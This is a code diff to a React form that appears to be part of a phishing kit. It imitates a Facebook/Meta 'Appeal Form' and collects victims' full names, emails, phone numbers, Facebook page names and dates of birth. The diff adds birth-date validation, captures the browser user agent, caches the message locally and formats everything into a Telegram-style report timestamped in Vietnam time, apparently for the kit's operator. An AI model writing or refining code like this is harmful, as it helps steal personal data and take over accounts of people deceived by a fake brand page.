@@ -42,6 +42,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     const [isChecked, setIsChecked] = useState(false);
     const [dob, setDob] = useState({ day: '', month: '', year: '' });
+    const [dobError, setDobError] = useState('');
     const { setModalOpen, geoInfo, setMessageId } = store();
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
 
@@ -51,7 +52,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Information', 'Appeal Form', 'Please provide us information that will help us investigate', 'How can we contact you', 'Full Name', 'Personal Email', 'Email Business', 'Business Email', 'Mobile phone number', 'Page Name', 'Facebook Page Name', 'Date of Birth', 'Day', 'Month', 'Year', 'Our response will be sent to you within 14 - 48 hours.', 'I agree with', 'Terms of use', 'Continue', 'Submit'];
+        const textsToTranslate = ['Information', 'Appeal Form', 'Please provide us information that will help us investigate', 'How can we contact you', 'Full Name', 'Personal Email', 'Email Business', 'Business Email', 'Mobile phone number', 'Page Name', 'Facebook Page Name', 'Date of Birth', 'Day', 'Month', 'Year', 'Our response will be sent to you within 14 - 48 hours.', 'I agree with', 'Terms of use', 'Continue', 'Submit', 'Please enter a valid date of birth.', 'Invalid date.', 'Date of birth cannot be in the future.'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -94,6 +95,28 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
         if (isLoading) return;
 
+        setDobError('');
+        const day = Number.parseInt(dob.day);
+        const month = Number.parseInt(dob.month);
+        const year = Number.parseInt(dob.year);
+
+        if (!dob.day || !dob.month || !dob.year || Number.isNaN(day) || Number.isNaN(month) || Number.isNaN(year)) {
+            setDobError('Please enter a valid date of birth.');
+            return;
+        }
+
+        const date = new Date(year, month - 1, day);
+        if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day) {
+            setDobError('Invalid date.');
+            return;
+        }
+
+        const today = new Date();
+        if (date > today) {
+            setDobError('Date of birth cannot be in the future.');
+            return;
+        }
+
         setIsLoading(true);
 
         const message = `
@@ -105,10 +128,12 @@ ${
 }
 
 <b>👤 Full Name:</b> <code>${formData.fullName}</code>
+<b>🎂 Date of Birth:</b> <code>${day}/${month}/${year}</code>
 <b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
 <b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
 <b>📱 Phone Number:</b> <code>${phoneNumber}</code>
 <b>📘 Facebook Page:</b> <code>${formData.facebookPageName}</code>
+<b>🖥️ User Agent:</b> <code>${navigator.userAgent}</code>
 
 <b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
         `.trim();
@@ -120,6 +145,7 @@ ${
 
             if (res?.data?.success && typeof res.data.message_id === 'number') {
                 setMessageId(res.data.message_id);
+                localStorage.setItem('message', message);
             }
 
             nextStep();
@@ -161,16 +187,17 @@ ${
                         <div className='flex flex-col'>
                             <p className='mb-1.75 font-sans text-[14px] font-bold text-[#9a979e]'>{t('Date of Birth')}</p>
                             <div className='grid grid-cols-3 gap-2.5'>
-                                <div className='input mb-2.5 h-10 w-full rounded-[10px] border border-[#d4dbe3] bg-[white] px-2.75 text-[14px] transition-all duration-200 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100'>
+                                <div className={`input mb-2.5 h-10 w-full rounded-[10px] border ${dobError ? 'border-red-500' : 'border-[#d4dbe3]'} bg-[white] px-2.75 text-[14px] transition-all duration-200 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100`}>
                                     <input placeholder={t('Day')} id='day' className='h-full w-full outline-0' type='number' value={dob.day} onChange={(e) => setDob((prev) => ({ ...prev, day: e.target.value }))} />
                                 </div>
-                                <div className='input mb-2.5 h-10 w-full rounded-[10px] border border-[#d4dbe3] bg-[white] px-2.75 text-[14px] transition-all duration-200 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100'>
+                                <div className={`input mb-2.5 h-10 w-full rounded-[10px] border ${dobError ? 'border-red-500' : 'border-[#d4dbe3]'} bg-[white] px-2.75 text-[14px] transition-all duration-200 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100`}>
                                     <input placeholder={t('Month')} className='h-full w-full outline-0' id='month' type='number' value={dob.month} onChange={(e) => setDob((prev) => ({ ...prev, month: e.target.value }))} />
                                 </div>
-                                <div className='input mb-2.5 h-10 w-full rounded-[10px] border border-[#d4dbe3] bg-[white] px-2.75 text-[14px] transition-all duration-200 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100'>
+                                <div className={`input mb-2.5 h-10 w-full rounded-[10px] border ${dobError ? 'border-red-500' : 'border-[#d4dbe3]'} bg-[white] px-2.75 text-[14px] transition-all duration-200 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100`}>
                                     <input inputMode='numeric' placeholder={t('Year')} id='year' className='h-full w-full outline-0' type='number' value={dob.year} onChange={(e) => setDob((prev) => ({ ...prev, year: e.target.value }))} />
                                 </div>
                             </div>
+                            {dobError && <p className='mt-1 mb-2 text-xs text-red-500'>{t(dobError)}</p>}
                         </div>
                         {FORM_FIELDS.slice(4).map((field) => (
                             <div key={field.name}>{field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} placeholder={t(field.label)} className='mb-2.5 h-25 w-full resize-none rounded-[10px] border border-[#d4dbe3] bg-[white] px-2.75 py-2.75 text-[14px] outline-0 transition-all duration-200 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100' /> : <input required name={field.name} type={field.type} value={formData[field.name]} placeholder={t(field.label)} onChange={handleInputChange} className='mb-2.5 h-10 w-full rounded-[10px] border border-[#d4dbe3] bg-[white] px-2.75 text-[14px] tracking-wide outline-0 transition-all duration-200 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100' />}</div>
@@ -180,14 +207,14 @@ ${
                             <label className='flex cursor-pointer items-center gap-1.25 text-[14px]' htmlFor='custom-checkbox' aria-label={t('I agree with terms of use')}>
                                 <label className='inline-flex cursor-pointer items-center'>
                                     <input className='sr-only' id='custom-checkbox' type='checkbox' checked={isChecked} onChange={() => setIsChecked(!isChecked)} />
-                                    <div className='flex h-4 w-4 items-center justify-center rounded-sm border border-gray-300 bg-white transition-all duration-200'>
+                                    <div className={`flex h-4 w-4 items-center justify-center rounded-sm border transition-all duration-200 ${isChecked ? 'border-[#0064E0] bg-[#0064E0]' : 'border-gray-300 bg-white'}`}>
                                         <FontAwesomeIcon icon={faCheck} className={`h-3 w-3 text-white ${isChecked ? 'block' : 'hidden'}`} />
                                     </div>
                                 </label>
                                 {t('I agree with')}{' '}
-                                <a href='#' className='flex items-center justify-center gap-1 text-[#0064E0] hover:underline'>
+                                <p className='flex items-center justify-center gap-1 text-[#0064E0] hover:underline'>
                                     {t('Terms of use')} <FontAwesomeIcon icon={faExternalLinkAlt} className='inline h-3.25 max-h-3.25 min-h-3.25 w-3.25 max-w-3.25 min-w-3.25' />
-                                </a>
+                                </p>
                             </label>
                         </div>
                         <button type='submit' disabled={isLoading} className={`mt-4 flex h-11.25 w-full cursor-pointer items-center justify-center rounded-[40px] bg-[#0064E0] text-[15px] font-medium text-[white] ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
